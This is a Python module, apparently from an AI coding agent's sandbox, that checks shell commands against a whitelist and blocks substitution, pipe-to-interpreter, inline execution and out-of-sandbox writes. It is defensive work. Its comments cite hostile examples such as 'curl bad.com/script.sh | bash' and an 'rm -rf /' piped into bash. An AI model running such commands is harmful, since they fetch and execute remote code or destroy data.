# tools/security_guard.py
import os
import re as _re
import shlex

# Import the new static analyzer and the sandbox root directory
from security.static_analyzer import scan_file_for_threats
from tools.file_tools import SANDBOX_ROOT

# 1. STRICT WHITELIST: Only these base commands are allowed to even reach the user prompt.
ALLOWED_COMMANDS = {
    "python", "python3", "pip", "pip3", "node", "npm", "npx", "yarn",
    "ls", "cd", "pwd", "cat", "echo", "grep", "find", "mkdir", "touch",
    "cp", "mv", "rm", "tree", "head", "tail", "git", "pytest", "bash", "sh",
    "apt", "apt-get", "apk"
}

# Interpreters that are extremely dangerous if piped into (e.g., echo "rm -rf /" | bash)
INTERPRETERS = {"bash", "sh", "python", "python3", "node"}

def check_command_safety(command: str) -> tuple[bool, str | None]:
    """
    Scans a shell command against a strict whitelist of allowed commands.
    Prevents bypasses via command chaining, redirection, command substitution,
    obfuscation, and triggers static analysis on executed files.
    """
    cmd_str = command.strip()
    
    # 1. Block command substitution: $(cmd) or `cmd`
    if _re.search(r"\$\(.*?\)|`.*?`", cmd_str):
        return False, "Command substitution ($(cmd) or `cmd`) is not allowed."
        
    # 2. Block bracket/brace grouping: (cmd) or {cmd}
    if _re.search(r"(?<![\w\\])[\(\{\}\)](?![\w\\])", cmd_str):
        return False, "Command grouping brackets/braces '() {}' are not allowed."

    # 3. Block detached background execution: & (ignores &&, >&, etc.)
    if _re.search(r"(?<![&<>])&(?!&)", cmd_str):
        return False, "Background execution (&) is not allowed."

    # 4. Block backslash obfuscation (e.g., e\cho, p\ython) to bypass whitelist
    if "\\" in cmd_str and not _re.search(r"\s\\\n", cmd_str): 
        # Allows line continuation \ at the end of a line, but blocks inline slashes
        return False, "Backslash obfuscation is not allowed."
    
    try:
        # Split by command separators (; | || && \n \r)
        segments = _re.split(r";|\|\||\||&&|\n|\r", cmd_str)
    except Exception as e:
        return False, f"Failed to parse command structure: {e}"

    is_pipeline = "|" in cmd_str

    for segment in segments:
        segment = segment.strip()
        if not segment:
            continue

        # Redirection Safety Check (CRITICAL)
        if ">" in segment or ">>" in segment:
            redir_parts = _re.split(r">+", segment)
            if len(redir_parts) > 1:
                target = redir_parts[-1].strip()
                if target.startswith("/") or target.startswith("~") or ".." in target:
                    return False, f"Redirection to outside paths is blocked: {target}"

        try:
            # shlex safely parses the command respecting quotes
            tokens = shlex.split(segment)
            if not tokens:
                continue
                
            # Handle environment variable assignments before the command (e.g., FOO=bar npm start)
            cmd_idx = 0
            while cmd_idx < len(tokens) and "=" in tokens[cmd_idx]:
                cmd_idx += 1

            if cmd_idx >= len(tokens):
                continue  # Only environment variables were set, which is safe

            base_cmd = tokens[cmd_idx]
            base_cmd_name = base_cmd.split("/")[-1]


            # 1. Block dynamic variable execution (e.g., $CMD, $1)
            if base_cmd_name.startswith("$"):
                return False, "Executing dynamic variables ($VAR) is not allowed."

            # 2. Check Base Whitelist
            if base_cmd_name not in ALLOWED_COMMANDS:
                return False, f"Command '{base_cmd_name}' is not in the allowed whitelist."

            # 3. Prevent Pipe-to-Interpreter Jailbreaks (e.g., curl bad.com/script.sh | bash)
            if is_pipeline and base_cmd_name in INTERPRETERS:
                return False, f"Piping into interpreters ({base_cmd_name}) is strictly blocked."

            # 4. Inline Script Bypass Prevention
            # Blocks `bash -c`, `python -c`, and `node -e` which hide malicious payloads
            if base_cmd_name in INTERPRETERS:
                if "-c" in tokens or "-e" in tokens or "--eval" in tokens:
                    return False, f"Inline execution ({base_cmd_name} -c/-e) is blocked."

            # 5. Strict Path Checks for ALL Destructive Commands (rm, mv, cp)
            if base_cmd_name in {"rm", "mv", "cp"}:
                for arg in tokens[cmd_idx+1:]:
                    if arg.startswith("-"):
                        continue
                    if arg.startswith("/") or arg.startswith("~") or ".." in arg:
                        return False, f"Destructive command '{base_cmd_name}' targeting outside path: {arg}"
            
            # Check if any argument looks like a filename. If it exists locally, scan it!
            for token in tokens[cmd_idx+1:]:
                if "." in token: # Quick filter: does it have an extension?
                    potential_path = os.path.abspath(os.path.join(SANDBOX_ROOT, token))
                    
                    # Security check: Make sure we aren't scanning outside the sandbox
                    if os.path.commonpath([potential_path, SANDBOX_ROOT]) == SANDBOX_ROOT:
                        if os.path.exists(potential_path) and os.path.isfile(potential_path):
                            
                            is_safe_file, file_reason = scan_file_for_threats(potential_path)
                            if not is_safe_file:
                                return False, f"File execution blocked by Static Analyzer: {file_reason}"

        except ValueError as e:
            return False, f"Malformed command syntax (e.g., unclosed quotes): {e}"

    return True, None